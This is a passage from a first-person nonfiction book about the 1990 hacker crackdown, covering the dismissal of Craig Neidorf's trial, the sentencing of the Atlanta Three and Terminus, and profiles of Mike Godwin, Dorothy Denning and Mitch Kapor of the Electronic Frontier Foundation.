and the Chicago group would send Terminus to prison for it.  But it was of dubious relevance in the Neidorf case. Neidorf hadn't written the program.  He wasn't accused of ever having used it.  And Neidorf wasn't being charged with software theft or owning a password trapper.    On the next day, Zenner took the offensive.  The civil libertarians now had their own arcane, untried legal weaponry to launch into action  the Electronic Communications Privacy Act of 1986, 18 US Code, Section 2701 et seq.  Section 2701 makes it a crime to intentionally access without authorization a facility in which an electronic communication service is provided  it is, at heart, an anti bugging and anti tapping law, intended to carry the traditional protections of telephones into other electronic channels of communication.  While providing penalties for amateur snoops, however, Section 2703 of the ECPA also lays some formal difficulties on the bugging and tapping activities of police.    The Secret Service, in the person of Tim Foley, had served Richard Andrews with a federal grand jury subpoena, in their pursuit of Prophet, the E911 Document, and the Terminus software ring.  But according to the Electronic Communications Privacy Act, a  provider of remote computing service  was legally entitled to  prior notice  from the government if a subpoena was used.  Richard Andrews and his basement UNIX node, Jolnet, had not received any  prior notice.   Tim Foley had purportedly violated the ECPA and committed an electronic crime!  Zenner now sought the judge's permission to cross examine Foley on the topic of Foley's own electronic misdeeds.    Cook argued that Richard Andrews' Jolnet was a privately owned bulletin board, and not within the purview of ECPA.  Judge Bua granted the motion of the government to prevent cross  examination on that point, and Zenner's offensive fizzled.  This, however, was the first direct assault on the legality of the actions of the Computer Fraud and Abuse Task Force itself  the first suggestion that they themselves had broken the law, and might, perhaps, be called to account.    Zenner, in any case, did not really need the ECPA. Instead, he grilled Foley on the glaring contradictions in the supposed value of the E911 Document.  He also brought up the embarrassing fact that the supposedly red hot E911 Document had been sitting around for months, in Jolnet, with Kluepfel's knowledge, while Kluepfel had done nothing about it.    In the afternoon, the Prophet was brought in to testify for the prosecution.   The Prophet, it will be recalled, had also been indicted in the case as partner in a fraud scheme with Neidorf.   In Atlanta, the Prophet had already pled guilty to one charge of conspiracy, one charge of wire fraud and one charge of interstate transportation of stolen property.  The wire fraud charge, and the stolen property charge, were both directly based on the E911 Document.    The twenty year old Prophet proved a sorry customer, answering questions politely but in a barely audible mumble, his voice trailing off at the ends of sentences.  He was constantly urged to speak up.    Cook, examining Prophet, forced him to admit that he had once had a  drug problem,  abusing amphetamines, marijuana, cocaine, and LSD.  This may have established to the jury that  hackers  are, or can be, seedy lowlife characters, but it may have damaged Prophet's credibility somewhat.  Zenner later suggested that drugs might have damaged Prophet's memory.  The interesting fact also surfaced that Prophet had never physically met Craig Neidorf.  He didn't even know Neidorf's last name  at least, not until the trial.    Prophet confirmed the basic facts of his hacker career. He was a member of the Legion of Doom.  He had abused codes, he had broken into switching stations and re routed calls, he had hung out on pirate bulletin boards.  He had raided the BellSouth AIMSX computer, copied the E911 Document, stored it on Jolnet, mailed it to Neidorf.  He and Neidorf had edited it, and Neidorf had known where it came from.    Zenner, however, had Prophet confirm that Neidorf was not a member of the Legion of Doom, and had not urged Prophet to break into BellSouth computers.  Neidorf had never urged Prophet to defraud anyone, or to steal anything.  Prophet also admitted that he had never known Neidorf to break in to any computer. Prophet said that no one in the Legion of Doom considered Craig Neidorf a  hacker  at all.  Neidorf was not a UNIX maven, and simply lacked the necessary skill and ability to break into computers.  Neidorf just published a magazine.    On Friday, July 27, 1990, the case against Neidorf collapsed.  Cook moved to dismiss the indictment, citing  information currently available to us that was not available to us at the inception of the trial.   Judge Bua praised the prosecution for this action, which he described as  very responsible,  then dismissed a juror and declared a mistrial.    Neidorf was a free man.  His defense, however, had cost himself and his family dearly.  Months of his life had been consumed in anguish  he had seen his closest friends shun him as a federal criminal.  He owed his lawyers over a hundred thousand dollars, despite a generous payment to the defense by Mitch Kapor.    Neidorf was not found innocent.  The trial was simply dropped.  Nevertheless, on September 9, 1991, Judge Bua granted Neidorf's motion for the  expungement and sealing  of his indictment record.  The United States Secret Service was ordered to delete and destroy all fingerprints, photographs, and other records of arrest or processing relating to Neidorf's indictment, including their paper documents and their computer records.    Neidorf went back to school, blazingly determined to become a lawyer.  Having seen the justice system at work, Neidorf lost much of his enthusiasm for merely technical power.  At this writing, Craig Neidorf is working in Washington as a salaried researcher for the American Civil Liberties Union.       The outcome of the Neidorf trial changed the EFF from voices in the wilderness to the media darlings of the new frontier.    Legally speaking, the Neidorf case was not a sweeping triumph for anyone concerned.  No constitutional principles had been established.  The issues of  freedom of the press  for electronic publishers remained in legal limbo.  There were public misconceptions about the case.  Many people thought Neidorf had been found innocent and relieved of all his legal debts by Kapor. The truth was that the government had simply dropped the case, and Neidorf's family had gone deeply into hock to support him.    But the Neidorf case did provide a single, devastating, public sound bite   THE FEDS SAID IT WAS WORTH EIGHTY GRAND, AND IT WAS ONLY WORTH THIRTEEN BUCKS.    This is the Neidorf case's single most memorable element. No serious report of the case missed this particular element. Even cops could not read this without a wince and a shake of the head.  It left the public credibility of the crackdown agents in tatters.    The crackdown, in fact, continued, however.  Those two charges against Prophet, which had been based on the E911 Document, were quietly forgotten at his sentencing  even though Prophet had already pled guilty to them.  Georgia federal prosecutors strongly argued for jail time for the Atlanta Three, insisting on  the need to send a message to the community,   the message that hackers around the country need to hear.     There was a great deal in their sentencing memorandum about the awful things that various other hackers had done  though the Atlanta Three themselves had not, in fact, actually committed these crimes .  There was also much speculation about the awful things that the Atlanta Three MIGHT have done and WERE CAPABLE of doing  even though they had not, in fact, actually done them .  The prosecution's argument carried the day.  The Atlanta Three were sent to prison   Urvile and Leftist both got 14 months each, while Prophet  a second offender  got 21 months.    The Atlanta Three were also assessed staggering fines as  restitution     233,000 each.  BellSouth claimed that the defendants had  stolen   approximately  233,880 worth  of  proprietary computer access information   specifically,  233,880 worth of computer passwords and connect addresses.  BellSouth's astonishing claim of the extreme value of its own computer passwords and addresses was accepted at face value by the Georgia court.  Furthermore  as if to emphasize its theoretical nature  this enormous sum was not divvied up among the Atlanta Three, but each of them had to pay all of it.    A striking aspect of the sentence was that the Atlanta Three were specifically forbidden to use computers, except for work or under supervision.  Depriving hackers of home computers and modems makes some sense if one considers hackers as  computer addicts,  but EFF, filing an amicus brief in the case, protested that this punishment was unconstitutional  it deprived the Atlanta Three of their rights of free association and free expression through electronic media.    Terminus, the  ultimate hacker,  was finally sent to prison for a year through the dogged efforts of the Chicago Task Force.  His crime, to which he pled guilty, was the transfer of the UNIX password trapper, which was officially valued by AT T at  77,000, a figure which aroused intense skepticism among those familiar with UNIX  login.c  programs.    The jailing of Terminus and the Atlanta Legionnaires of Doom, however, did not cause the EFF any sense of embarrassment or defeat.  On the contrary, the civil libertarians were rapidly gathering strength.    An early and potent supporter was Senator Patrick Leahy, Democrat from Vermont, who had been a Senate sponsor of the Electronic Communications Privacy Act.  Even before the Neidorf trial, Leahy had spoken out in defense of hacker power and freedom of the keyboard    We cannot unduly inhibit the inquisitive 13 year old who, if left to experiment today, may tomorrow develop the telecommunications or computer technology to lead the United States into the 21st century.  He represents our future and our best hope to remain a technologically competitive nation.     It was a handsome statement, rendered perhaps rather more effective by the fact that the crackdown raiders DID NOT HAVE any Senators speaking out for THEM.  On the contrary, their highly secretive actions and tactics, all  sealed search warrants  here and  confidential ongoing investigations  there, might have won them a burst of glamorous publicity at first, but were crippling them in the on going propaganda war.  Gail Thackeray was reduced to unsupported bluster    Some of these people who are loudest on the bandwagon may just slink into the background,  she predicted in NEWSWEEK  when all the facts came out, and the cops were vindicated.    But all the facts did not come out.  Those facts that did, were not very flattering.  And the cops were not vindicated. And Gail Thackeray lost her job.  By the end of 1991, William Cook had also left public employment.    1990 had belonged to the crackdown, but by '91 its agents were in severe disarray, and the libertarians were on a roll. People were flocking to the cause.    A particularly interesting ally had been Mike Godwin of Austin, Texas.  Godwin was an individual almost as difficult to describe as Barlow  he had been editor of the student newspaper of the University of Texas, and a computer salesman, and a programmer, and in 1990 was back in law school, looking for a law degree.    Godwin was also a bulletin board maven.  He was very well known in the Austin board community under his handle  Johnny Mnemonic,  which he adopted from a cyberpunk science fiction story by William Gibson.  Godwin was an ardent cyberpunk science fiction fan.  As a fellow Austinite of similar age and similar interests, I myself had known Godwin socially for many years. When William Gibson and myself had been writing our collaborative SF novel, THE DIFFERENCE ENGINE, Godwin had been our technical advisor in our effort to link our Apple word processors from Austin to Vancouver.  Gibson and I were so pleased by his generous expert help that we named a character in the novel  Michael Godwin  in his honor.    The handle  Mnemonic  suited Godwin very well.  His erudition and his mastery of trivia were impressive to the point of stupor  his ardent curiosity seemed insatiable, and his desire to debate and argue seemed the central drive of his life.  Godwin had even started his own Austin debating society, wryly known as the  Dull Men's Club.   In person, Godwin could be overwhelming  a flypaper brained polymath who could not seem to let any idea go.  On bulletin boards, however, Godwin's closely reasoned, highly grammatical, erudite posts suited the medium well, and he became a local board celebrity.    Mike Godwin was the man most responsible for the public national exposure of the Steve Jackson case.  The Izenberg seizure in Austin had received no press coverage at all.  The March 1 raids on Mentor, Bloodaxe, and Steve Jackson Games had received a brief front page splash in the front page of the AUSTIN AMERICAN STATESMAN, but it was confused and ill informed  the warrants were sealed, and the Secret Service wasn't talking. Steve Jackson seemed doomed to obscurity.  Jackson had not been arrested  he was not charged with any crime  he was not on trial. He had lost some computers in an ongoing investigation  so what  Jackson tried hard to attract attention to the true extent of his plight, but he was drawing a blank  no one in a position to help him seemed able to get a mental grip on the issues.    Godwin, however, was uniquely, almost magically, qualified to carry Jackson's case to the outside world.  Godwin was a board enthusiast, a science fiction fan, a former journalist, a computer salesman, a lawyer to be, and an Austinite.  Through a coincidence yet more amazing, in his last year of law school Godwin had specialized in federal prosecutions and criminal procedure.  Acting entirely on his own, Godwin made up a press packet which summarized the issues and provided useful contacts for reporters.  Godwin's behind the scenes effort  which he carried out mostly to prove a point in a local board debate  broke the story again in the AUSTIN AMERICAN STATESMAN and then in NEWSWEEK.    Life was never the same for Mike Godwin after that.  As he joined the growing civil liberties debate on the Internet, it was obvious to all parties involved that here was one guy who, in the midst of complete murk and confusion, GENUINELY UNDERSTOOD EVERYTHING HE WAS TALKING ABOUT.  The disparate elements of Godwin's dilettantish existence suddenly fell together as neatly as the facets of a Rubik's cube.    When the time came to hire a full time EFF staff attorney, Godwin was the obvious choice.  He took the Texas bar exam, left Austin, moved to Cambridge, became a full time, professional, computer civil libertarian, and was soon touring the nation on behalf of EFF, delivering well received addresses on the issues to crowds as disparate as academics, industrialists, science fiction fans, and federal cops.    Michael Godwin is currently the chief legal counsel of the Electronic Frontier Foundation in Cambridge, Massachusetts.       Another early and influential participant in the controversy was Dorothy Denning.  Dr. Denning was unique among investigators of the computer underground in that she did not enter the debate with any set of politicized motives.  She was a professional cryptographer and computer security expert whose primary interest in hackers was SCHOLARLY.  She had a B.A. and M.A. in mathematics, and a Ph.D. in computer science from Purdue. She had worked for SRI International, the California think tank that was also the home of computer security maven Donn Parker, and had authored an influential text called CRYPTOGRAPHY AND DATA SECURITY.  In 1990, Dr. Denning was working for Digital Equipment Corporation in their Systems Reseach Center.  Her husband, Peter Denning, was also a computer security expert, working for NASA's Research Institute for Advanced Computer Science.  He had edited the well received COMPUTERS UNDER ATTACK  INTRUDERS, WORMS AND VIRUSES.     Dr. Denning took it upon herself to contact the digital underground, more or less with an anthropological interest. There she discovered that these computer intruding hackers, who had been characterized as unethical, irresponsible, and a serious danger to society, did in fact have their own subculture and their own rules.  They were not particularly well considered rules, but they were, in fact, rules.  Basically, they didn't take money and they didn't break anything.    Her dispassionate reports on her researches did a great deal to influence serious minded computer professionals  the sort of people who merely rolled their eyes at the cyberspace rhapsodies of a John Perry Barlow.    For young hackers of the digital underground, meeting Dorothy Denning was a genuinely mind boggling experience.  Here was this neatly coiffed, conservatively dressed, dainty little personage, who reminded most hackers of their moms or their aunts.  And yet she was an IBM systems programmer with profound expertise in computer architectures and high security information flow, who had personal friends in the FBI and the National Security Agency.    Dorothy Denning was a shining example of the American mathematical intelligentsia, a genuinely brilliant person from the central ranks of the computer science elite.  And here she was, gently questioning twenty year old hairy eyed phone phreaks over the deeper ethical implications of their behavior.    Confronted by this genuinely nice lady, most hackers sat up very straight and did their best to keep the anarchy file stuff down to a faint whiff of brimstone.  Nevertheless, the hackers WERE in fact prepared to seriously discuss serious issues with Dorothy Denning.  They were willing to speak the unspeakable and defend the indefensible, to blurt out their convictions that information cannot be owned, that the databases of governments and large corporations were a threat to the rights and privacy of individuals.    Denning's articles made it clear to many that  hacking  was not simple vandalism by some evil clique of psychotics.  Hacking  was not an aberrant menace that could be charmed away by ignoring it, or swept out of existence by jailing a few ringleaders.  Instead,  hacking  was symptomatic of a growing, primal struggle over knowledge and power in the age of information.    Denning pointed out that the attitude of hackers were at least partially shared by forward looking management theorists in the business community  people like Peter Drucker and Tom Peters. Peter Drucker, in his book THE NEW REALITIES, had stated that  control of information by the government is no longer possible. Indeed, information is now transnational.  Like money, it has no 'fatherland.'     And management maven Tom Peters had chided large corporations for uptight, proprietary attitudes in his bestseller, THRIVING ON CHAOS    Information hoarding, especially by politically motivated, power seeking staffs, had been commonplace throughout American industry, service and manufacturing alike. It will be an impossible millstone aroung the neck of tomorrow's organizations.     Dorothy Denning had shattered the social membrane of the digital underground.  She attended the Neidorf trial, where she was prepared to testify for the defense as an expert witness. She was a behind the scenes organizer of two of the most important national meetings of the computer civil libertarians. Though not a zealot of any description, she brought disparate elements of the electronic community into a surprising and fruitful collusion.    Dorothy Denning is currently the Chair of the Computer Science Department at Georgetown University in Washington, DC.       There were many stellar figures in the civil libertarian community.  There's no question, however, that its single most influential figure was Mitchell D. Kapor.  Other people might have formal titles, or governmental positions, have more experience with crime, or with the law, or with the arcanities of computer security or constitutional theory.  But by 1991 Kapor had transcended any such narrow role.  Kapor had become  Mitch.     Mitch had become the central civil libertarian ad hocrat. Mitch had stood up first, he had spoken out loudly, directly, vigorously and angrily, he had put his own reputation, and his very considerable personal fortune, on the line.  By mid '91 Kapor was the best known advocate of his cause and was known PERSONALLY by almost every single human being in America with any direct influence on the question of civil liberties in cyberspace.  Mitch had built bridges, crossed voids, changed paradigms, forged metaphors, made phone calls and swapped business cards to such spectacular effect that it had become impossible for anyone to take any action in the  hacker question  without wondering what Mitch might think  and say  and tell his friends.    The EFF had simply NETWORKED the situation into an entirely new status quo.  And in fact this had been EFF's deliberate strategy from the beginning.  Both Barlow and Kapor loathed bureaucracies and had deliberately chosen to work almost entirely through the electronic spiderweb of  valuable personal contacts.     After a year of EFF, both Barlow and Kapor had every reason to look back with satisfaction.  EFF had established its own Internet node,  eff.org,  with a well stocked electronic archive of documents on electronic civil rights, privacy issues, and academic freedom.  EFF was also publishing _EFFector_, a quarterly printed journal, as well as _EFFector Online_, an electronic newsletter with over 1,200 subscribers.  And EFF was thriving on the Well.    EFF had a national headquarters in Cambridge and a full  time staff.  It had become a membership organization and was attracting grass roots support.  It had also attracted the support of some thirty civil rights lawyers, ready and eager to do pro bono work in defense of the Constitution in Cyberspace.    EFF had lobbied successfully in Washington and in Massachusetts to change state and federal legislation on computer networking.  Kapor in particular had become a veteran expert witness, and had joined the Computer Science and Telecommunications Board of the National Academy of Science and Engineering.    EFF had sponsored meetings such as  Computers, Freedom and Privacy  and the CPSR Roundtable.  It had carried out a press offensive that, in the words of _EFFector_,  has affected the climate of opinion about computer networking and begun to reverse the slide into 'hacker hysteria' that was beginning to grip the nation.     It had helped Craig Neidorf avoid prison.    And, last but certainly not least, the Electronic Frontier Foundation had filed a federal lawsuit in the name of Steve Jackson, Steve Jackson Games Inc., and three users of the Illuminati bulletin board system.  The defendants were, and are, the United States Secret Service, William Cook, Tim Foley, Barbara Golden and Henry Kleupfel.    The case, which is in pre trial procedures in an Austin federal court as of this writing, is a civil action for damages to redress alleged violations of the First and Fourth Amendments to the United States Constitution, as well as the Privacy Protection Act of 1980  42 USC 2000aa et seq. , and the Electronic Communications Privacy Act  18 USC 2510 et seq and 2701 et seq .    EFF had established that it had credibility.  It had also established that it had teeth.    In the fall of 1991 I travelled to Massachusetts to speak personally with Mitch Kapor.  It was my final interview for this book.       The city of Boston has always been one of the major intellectual centers of the American republic.  It is a very old city by American standards, a place of skyscrapers overshadowing seventeenth century graveyards, where the high tech start up companies of Route 128 co exist with the hand wrought pre  industrial grace of  Old Ironsides,  the USS CONSTITUTION.    The Battle of Bunker Hill, one of the first and bitterest armed clashes of the American Revolution, was fought in Boston's environs.  Today there is a monumental spire on Bunker Hill, visible throughout much of the city.  The willingness of the republican revolutionaries to take up arms and fire on their oppressors has left a cultural legacy that two full centuries have not effaced.  Bunker Hill is still a potent center of American political symbolism, and the Spirit of '76 is still a potent image for those who seek to mold public opinion.    Of course, not everyone who wraps himself in the flag is necessarily a patriot.  When I visited the spire in September 1991, it bore a huge, badly erased, spray can grafitto around its bottom reading  BRITS OUT  IRA PROVOS.   Inside this hallowed edifice was a glass cased diorama of thousands of tiny toy soldiers, rebels and redcoats, fighting and dying over the green hill, the riverside marshes, the rebel trenchworks.  Plaques indicated the movement of troops, the shiftings of strategy.  The Bunker Hill Monument is occupied at its very center by the toy soldiers of a military war game simulation.    The Boston metroplex is a place of great universities, prominent among the Massachusetts Institute of Technology, where the term  computer hacker  was first coined.  The Hacker Crackdown of 1990 might be interpreted as a political struggle among American cities   traditional strongholds of longhair intellectual liberalism, such as Boston, San Francisco, and Austin, versus the bare knuckle industrial pragmatism of Chicago and Phoenix  with Atlanta and New York wrapped in internal struggle .    The headquarters of the Electronic Frontier Foundation is on 155 Second Street in Cambridge, a Bostonian suburb north of the River Charles.  Second Street has weedy sidewalks of dented, sagging brick and elderly cracked asphalt  large street signs warn  NO PARKING DURING DECLARED SNOW EMERGENCY.   This is an old area of modest manufacturing industries  the EFF is catecorner from the Greene Rubber Company.  EFF's building is two stories of red brick  its large wooden windows feature gracefully arched tops and stone sills.    The glass window beside the Second Street entrance bears three sheets of neatly laser printed paper, taped against the glass.  They read   ON Technology.  EFF.  KEI.     ON Technology  is Kapor's software company, which currently specializes in  groupware  for the Apple Macintosh computer.   Groupware  is intended to promote efficient social interaction among office workers linked by computers.  ON Technology's most successful software products to date are  Meeting Maker  and  Instant Update.      KEI  is Kapor Enterprises Inc., Kapor's personal holding company, the commercial entity that formally controls his extensive investments in other hardware and software corporations.     EFF  is a political action group  of a special sort.    Inside, someone's bike has been chained to the handrails of a modest flight of stairs.  A wall of modish glass brick separates this anteroom from the offices.  Beyond the brick, there's an alarm system mounted on the wall, a sleek, complex little number that resembles a cross between a thermostat and a CD player.  Piled against the wall are box after box of a recent special issue of SCIENTIFIC AMERICAN,  How to Work, Play, and Thrive in Cyberspace,  with extensive coverage of electronic networking techniques and political issues, including an article by Kapor himself.  These boxes are addressed to Gerard Van der Leun, EFF's Director of Communications, who will shortly mail those magazines to every member of the EFF.    The joint headquarters of EFF, KEI, and ON Technology, which Kapor currently rents, is a modestly bustling place.  It's very much the same physical size as Steve Jackson's gaming company.  It's certainly a far cry from the gigantic gray steel  sided railway shipping barn, on the Monsignor O'Brien Highway, that is owned by Lotus Development Corporation.    Lotus is, of course, the software giant that Mitchell Kapor founded in the late 70s.  The software program Kapor co  authored,  Lotus 1 2 3,  is still that company's most profitable product.   Lotus 1 2 3  also bears a singular distinction in the digital underground  it's probably the most pirated piece of application software in world history.    Kapor greets me cordially in his own office, down a hall. Kapor, whose name is pronounced KAY por, is in his early forties, married and the father of two.  He has a round face, high forehead, straight nose, a slightly tousled mop of black hair peppered with gray.  His large brown eyes are wideset, reflective, one might almost say soulful.  He disdains ties, and commonly wears Hawaiian shirts and tropical prints, not so much garish as simply cheerful and just that little bit anomalous.    There is just the whiff of hacker brimstone about Mitch Kapor.  He may not have the hard riding, hell for leather, guitar strumming charisma of his Wyoming colleague John Perry Barlow, but there's something about the guy that still stops one short.  He has the air of the Eastern city dude in the bowler hat, the dreamy, Longfellow quoting poker shark who only HAPPENS to know the exact mathematical odds against drawing to an inside straight.  Even among his computer community colleagues, who are hardly known for mental sluggishness, Kapor strikes one forcefully as a very intelligent man.  He speaks rapidly, with vigorous gestures, his Boston accent sometimes slipping to the sharp nasal tang of his youth in Long Island.    Kapor, whose Kapor Family Foundation does much of his philanthropic work, is a strong supporter of Boston's Computer Museum.  Kapor's interest in the history of his industry has brought him some remarkable curios, such as the  byte  just outside his office door.  This  byte   eight digital bits  has been salvaged from the wreck of an electronic computer of the pre transistor age.  It's a standing gunmetal rack about the size of a small toaster oven   with eight slots of hand soldered breadboarding featuring thumb sized vacuum tubes.  If it fell off a table it could easily break your foot, but it was state of the  art computation in the 1940s.   It would take exactly 157,184 of these primordial toasters to hold the first part of this book.     There's also a coiling, multicolored, scaly dragon that some inspired techno punk artist has cobbled up entirely out of transistors, capacitors, and brightly plastic coated wiring.    Inside the office, Kapor excuses himself briefly to do a little mouse whizzing housekeeping on his personal Macintosh IIfx.  If its giant screen were an open window, an agile person could climb through it without much trouble at all.  There's a coffee cup at Kapor's elbow, a memento of his recent trip to Eastern Europe, which has a black and white stencilled photo and the legend CAPITALIST FOOLS TOUR.  It's Kapor, Barlow, and two California venture capitalist luminaries of their acquaintance, four windblown, grinning Baby Boomer dudes in leather jackets, boots, denim, travel bags, standing on airport tarmac somewhere behind the formerly Iron Curtain.  They look as if they're having the absolute time of their lives.    Kapor is in a reminiscent mood.  We talk a bit about his youth  high school days as a  math nerd,  Saturdays attending Columbia University's high school science honors program, where he had his first experience programming computers.  IBM 1620s, in 1965 and '66.   I was very interested,  says Kapor,  and then I went off to college and got distracted by drugs sex and rock and roll, like anybody with half a brain would have then!   After college he was a progressive rock DJ in Hartford, Connecticut, for a couple of years.    I ask him if he ever misses his rock and roll days  if he ever wished he could go back to radio work.    He shakes his head flatly.   I stopped thinking about going back to be a DJ the day after Altamont.     Kapor moved to Boston in 1974 and got a job programming mainframes in COBOL.  He hated it.  He quit and became a teacher of transcendental meditation.   It was Kapor's long flirtation with Eastern mysticism that gave the world  Lotus.      In 1976 Kapor went to Switzerland, where the Transcendental Meditation movement had rented a gigantic Victorian hotel in St Moritz.  It was an all male group  a hundred and twenty of them  determined upon Enlightenment or Bust.  Kapor had given the transcendant his best shot.  He was becoming disenchanted by  the nuttiness in the organization.   They were teaching people to levitate,  he says, staring at the floor.  His voice drops an octave, becomes flat.   THEY DON'T LEVITATE.      Kapor chose Bust.  He went back to the States and acquired a degree in counselling psychology.  He worked a while in a hospital, couldn't stand that either.   My rep was,  he says,  a very bright kid with a lot of potential who hasn't found himself.  Almost thirty.  Sort of lost.     Kapor was unemployed when he bought his first personal computer  an Apple II.  He sold his stereo to raise cash and drove to New Hampshire to avoid the sales tax.     The day after I purchased it,  Kapor tells me,  I was hanging out in a computer store and I saw another guy, a man in his forties, well dressed guy, and eavesdropped on his conversation with the salesman.  He didn't know anything about computers.  I'd had a year programming.  And I could program in BASIC.  I'd taught myself.  So I went up to him, and I actually sold myself to him as a consultant.   He pauses.   I don't know where I got the nerve to do this.  It was uncharacteristic.  I just said, 'I think I can help you, I've been listening, this is what you need to do and I think I can do it for you.'  And he took me on!  He was my first client!  I became a computer consultant the first day after I bought the Apple II.     Kapor had found his true vocation.  He attracted more clients for his consultant service, and started an Apple users' group.    A friend of Kapor's, Eric Rosenfeld, a graduate student at MIT, had a problem.  He was doing a thesis on an arcane form of financial statistics, but could not wedge himself into the crowded queue for time on MIT's mainframes.   One might note at this point that if Mr. Rosenfeld had dishonestly broken into the MIT mainframes, Kapor himself might have never invented Lotus 1  2 3 and the PC business might have been set back for years!  Eric Rosenfeld did have an Apple II, however, and he thought it might be possible to scale the problem down.  Kapor, as favor, wrote a program for him in BASIC that did the job.    It then occurred to the two of them, out of the blue, that it might be possible to SELL this program.  They marketed it themselves, in plastic baggies, for about a hundred bucks a pop, mail order.   This was a total cottage industry by a marginal consultant,  Kapor says proudly.   That's how I got started, honest to God.     Rosenfeld, who later became a very prominent figure on Wall Street, urged Kapor to go to MIT's business school for an MBA.  Kapor did seven months there, but never got his MBA.  He picked up some useful tools  mainly a firm grasp of the principles of accounting  and, in his own words,  learned to talk MBA.   Then he dropped out and went to Silicon Valley.    The inventors of VisiCalc, the Apple computer's premier business program, had shown an interest in Mitch Kapor.  Kapor worked diligently for them for six months, got tired of California, and went back to Boston where they had better bookstores.  The VisiCalc group had made the critical error of bringing in  professional management.    That drove them into the ground,  Kapor says.     Yeah, you don't hear a lot about VisiCalc these days,  I muse.    Kapor looks surprised.   Well, Lotus.... we BOUGHT it.      Oh.  You BOUGHT it       Yeah.      Sort of like the Bell System buying Western Union      Kapor grins.   Yep!  Yep!  Yeah, exactly!     Mitch Kapor was not in full command of the destiny of himself or his industry.  The hottest software commodities of the early 1980s were COMPUTER GAMES  the Atari seemed destined to enter every teenage home in America.  Kapor got into business software simply because he didn't have any particular feeling for computer games.  But he was supremely fast on his feet, open to new ideas and inclined to trust his instincts.  And his instincts were good.  He chose good people to deal with  gifted programmer Jonathan Sachs  the co author of Lotus 1 2 3 .  Financial wizard Eric Rosenfeld, canny Wall Street analyst and venture capitalist Ben Rosen.  Kapor was the founder and CEO of Lotus, one of the most spectacularly successful business ventures of the later twentieth century.    He is now an extremely wealthy man.  I ask him if he actually knows how much money he has.     Yeah,  he says.   Within a percent or two.     How much does he actually have, then     He shakes his head.   A lot.  A lot.  Not something I talk about.  Issues of money and class are things that cut pretty close to the bone.     I don't pry.  It's beside the point.  One might presume, impolitely, that Kapor has at least forty million  that's what he got the year he left Lotus.  People who ought to know claim Kapor has about a hundred and fifty million, give or take a market swing in his stock holdings.  If Kapor had stuck with Lotus, as his colleague friend and rival Bill Gates has stuck with his own software start up, Microsoft, then Kapor would likely have much the same fortune Gates has  somewhere in the neighborhood of three billion, give or take a few hundred million.  Mitch Kapor has all the money he wants.  Money has lost whatever charm it ever held for him  probably not much in the first place.  When Lotus became too uptight, too bureaucratic, too far from the true sources of his own satisfaction, Kapor walked.  He simply severed all connections with the company and went out the door.  It stunned everyone  except those who knew him best.    Kapor has not had to strain his resources to wreak a thorough transformation in cyberspace politics.  In its first year, EFF's budget was about a quarter of a million dollars. Kapor is running EFF out of his pocket change.    Kapor takes pains to tell me that he does not consider himself a civil libertarian per se.  He has spent quite some time with true blue civil libertarians lately, and there's a political correctness to them that bugs him.  They seem to him to spend entirely too much time in legal nitpicking and not enough vigorously exercising civil rights in the everyday real world.    Kapor is an entrepreneur.  Like all hackers, he prefers his involvements direct, personal, and hands on.   The fact that EFF has a node on the Internet is a great thing.  We're a publisher.  We're a distributor of information.   Among the items the eff.org Internet node carries is back issues of PHRACK.  They had an internal debate about that in EFF, and finally decided to take the plunge.  They might carry other digital underground publications  but if they do, he says,  we'll certainly carry Donn Parker, and anything Gail Thackeray wants to put up.  We'll turn it into a public library, that has the whole spectrum of use.  Evolve in the direction of people making up their own minds.   He grins.   We'll try to label all the editorials.     Kapor is determined to tackle the technicalities of the Internet in the service of the public interest.   The problem with being a node on the Net today is that you've got to have a captive technical specialist.  We have Chris Davis around, for the care and feeding of the balky beast!  We couldn't do it ourselves!     He pauses.   So one direction in which technology has to evolve is much more standardized units, that a non technical person can feel comfortable with.  It's the same shift as from minicomputers to PCs.  I can see a future in which any person can have a Node on the Net.  Any person can be a publisher.  It's better than the media we now have.  It's possible.  We're working actively.     Kapor is in his element now, fluent, thoroughly in command in his material.   You go tell a hardware Internet hacker that everyone should have a node on the Net,  he says,  and the first thing they're going to say is, 'IP doesn't scale!'     IP  is the interface protocol for the Internet.  As it currently exists, the IP software is simply not capable of indefinite expansion  it will run out of usable addresses, it will saturate.    The answer,  Kapor says,  is   evolve the protocol! Get the smart people together and figure out what to do.  Do we add ID   Do we add new protocol   Don't just say, WE CAN'T DO IT.     Getting smart people together to figure out what to do is a skill at which Kapor clearly excels.  I counter that people on the Internet rather enjoy their elite technical status, and don't seem particularly anxious to democratize the Net.    Kapor agrees, with a show of scorn.   I tell them that this is the snobbery of the people on the MAYFLOWER looking down their noses at the people who came over ON THE SECOND BOAT!  Just because they got here a year, or five years, or ten years before everybody else, that doesn't give them ownership of cyberspace! By what right      I remark that the telcos are an electronic network, too, and they seem to guard their specialized knowledge pretty closely.    Kapor ripostes that the telcos and the Internet are entirely different animals.   The Internet is an open system, everything is published, everything gets argued about, basically by anybody who can get in.  Mostly, it's exclusive and elitist just because it's so difficult.  Let's make it easier to use.     On the other hand, he allows with a swift change of emphasis, the so called elitists do have a point as well.  Before people start coming in, who are new, who want to make suggestions, and criticize the Net as 'all screwed up'....  They should at least take the time to understand the culture on its own terms.  It has its own history  show some respect for it. I'm a conservative, to that extent.     The Internet is Kapor's paradigm for the future of telecommunications.  The Internet is decentralized, non  hierarchical, almost anarchic.  There are no bosses, no chain of command, no secret data.  If each node obeys the general interface standards, there's simply no need for any central network authority.    Wouldn't that spell the doom of AT T as an institution  I ask.    That prospect doesn't faze Kapor for a moment.   Their big advantage, that they have now, is that they have all of the wiring.  But two things are happening.  Anyone with right of way is putting down fiber  Southern Pacific Railroad, people like that  there's enormous 'dark fiber' laid in.     Dark Fiber  is fiber optic cable, whose enormous capacity so exceeds the demands of current usage that much of the fiber still has no light  signals on it  it's still 'dark,' awaiting future use.      The other thing that's happening is the local loop stuff is going to go wireless.  Everyone from Bellcore to the cable TV companies to AT T wants to put in these things called 'personal communication systems.'  So you could have local competition  you could have multiplicity of people, a bunch of neighborhoods, sticking stuff up on poles.  And a bunch of other people laying in dark fiber.  So what happens to the telephone companies  There's enormous pressure on them from both sides.     The more I look at this, the more I believe that in a post industrial, digital world, the idea of regulated monopolies is bad.  People will look back on it and say that in the 19th and 20th centuries the idea of public utilities was an okay compromise.  You needed one set of wires in the ground.  It was too economically inefficient, otherwise.  And that meant one entity running it.  But now, with pieces being wireless  the connections are going to be via high level interfaces, not via wires.  I mean, ULTIMATELY there are going to be wires  but the wires are just a commodity.  Fiber, wireless.  You no longer NEED a utility.     Water utilities   Gas utilities     Of course we still need those, he agrees.   But when what you're moving is information, instead of physical substances, then you can 